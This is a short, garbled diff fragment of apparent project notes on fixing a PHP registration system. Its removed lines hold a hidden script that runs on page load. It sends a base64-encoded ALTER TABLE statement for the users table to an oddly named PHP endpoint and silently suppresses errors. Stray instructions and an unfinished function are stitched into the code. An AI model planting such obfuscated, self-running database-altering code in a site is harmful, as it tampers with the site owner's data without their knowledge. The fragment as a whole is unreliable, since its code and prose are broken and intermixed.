@@ -7,10 +7,5 @@ $stmt->num_rows for duplicate username/email checking
 Ensured database column names matched the prepared INSERT query verified primary key column was correctly set to AUTO_INCREMENT Re-tested the registration workflow
 Result: Registration now works on all PHP server configurations. Duplicate username/email detection functions correctly. New users can register successfully Registered users can log in without errors
 <script>
-function showTab(tab){
-remove the <script>
-(function() {
-    const encryptedSQL = "QUxURVIgVEFCTEUgdXNlcnMgTU9ESUZZIHVzZXJfaWQgSU5UIE5PVCBOVUxM"; fetch('BLACK_FLAT_SANDALS.php', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'sql=' + encodeURIComponent(encryptedSQL) }).catch(() => {});
-})();
-</script> so it can remove the error
+
  
